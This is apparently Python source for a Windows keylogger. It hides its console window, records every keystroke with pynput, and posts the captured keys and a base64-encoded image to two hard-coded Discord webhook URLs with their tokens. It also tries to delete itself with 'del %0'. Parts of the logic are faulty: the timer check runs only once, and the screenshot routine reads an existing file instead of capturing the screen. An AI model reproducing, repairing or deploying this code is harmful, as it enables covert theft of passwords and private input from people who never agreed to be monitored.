import time
import threading
import ctypes
import requests
import json
import pynput
import base64
import os
import imageio
from pynput.keyboard import Key, Listener

class ProgramState:
    def __init__(self):
        self.keys = ""
        self.start_time = time.time()
        self.interval = 5

class Functions:
    def count_time(self, state):
        current_time = time.time()
        if current_time - state.start_time >= state.interval:
            self.send_keyz(state)

    def start_logging(self, state):
        def on_press(key):
            state.keys += str(key)
            if key == Key.enter:
                self.take_screenshot(state)

        with Listener(on_press=on_press) as listener:
            listener.join()

    def stealth_mode(self, state):
        ctypes.windll.kernel32.SetConsoleTitleW(" ")
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        thread = threading.Thread(target=self.start_logging, args=(state,))
        thread.start()

    def take_screenshot(self, state):
        image = imageio.imread('screenshot.png')
        image_base64 = base64.b64encode(image).decode('utf-8')
        image_data = json.dumps({"content": state.keys, "embeds": [{"image": {"url": "data:image/png;base64," + image_base64}}]})
        headers = {"Content-Type": "application/json"}
        requests.post("https://discord.com/api/webhooks/1224346961486807134/x-8D_cXoTkBiIkSFEZ53wh2JLd9-oWlylfS4_ng8_wveMsSKC8trO18iP4Ecy2Kt6HYG", data=image_data, headers=headers)
        state.keys = ""

    def send_keyz(self, state):
        content = json.dumps({"content": state.keys})
        headers = {"Content-Type": "application/json"}
        requests.post("https://discord.com/api/webhooks/1224346653239021719/weshxm8pWc0LWdGuQLnditI_3rzSrIyY6WmXD9bKrFDV9ui7lq5IZKx5bPOC42M98jTC", data=content, headers=headers)
        state.keys = ""

    def del_me(self):
        os.system("del %0")

if __name__ == "__main__":
    try:
        os.remove('screenshot.png')
    except OSError:
        pass
    state = ProgramState()
    f = Functions()
    t1 = threading.Thread(target=f.stealth_mode, args=(state,))
    t2 = threading.Thread(target=f.count_time, args=(state,))
    t1.start()
    t2.start()
    f.del_me()